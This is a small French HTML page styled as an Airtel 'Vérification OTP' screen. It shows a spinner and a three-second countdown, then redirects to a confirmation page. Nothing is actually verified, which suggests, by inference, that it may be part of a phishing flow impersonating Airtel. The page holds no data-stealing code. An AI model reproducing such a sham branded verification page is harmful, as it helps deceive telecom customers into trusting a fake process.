<!doctype html><html lang="fr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Vérification OTP</title><link rel="stylesheet" href="validation-load.css"></head><body><main class="verification-page"><section class="verification-card"><div class="verification-spinner"></div><h1>Vérification de l'OTP</h1><p>Veuillez patienter... (<span id="count">3</span>s)</p></section></main><footer class="verification-footer"><img src="image.png" alt="Airtel — A reason to imagine"></footer><script>let seconds=3;const label=document.querySelector('#count');const timer=setInterval(()=>{seconds--;label.textContent=seconds;if(seconds<=0){clearInterval(timer);location.href='confirmation.html'}},1000)</script></body></html>
